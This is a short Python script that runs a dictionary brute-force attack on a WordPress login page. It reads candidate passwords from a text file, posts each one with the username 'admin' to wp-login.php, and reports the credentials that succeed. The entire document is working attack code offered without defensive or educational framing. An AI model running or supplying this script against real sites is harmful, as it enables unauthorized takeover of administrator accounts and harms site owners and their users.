import requests

url = "http://example.com/wp-login.php"  
username = "admin"  
passwords_file = "passwords.txt"  
with open(passwords_file, "r") as f:
    passwords = f.read().splitlines()

for password in passwords:
    data = {"log": username, "pwd": password}
    response = requests.post(url, data=data)

    if "wp-admin" in response.url:
        print(f"Login successful with credentials: {username}:{password}")
        break
    else:
        print(f"Login failed with credentials: {username}:{password}")
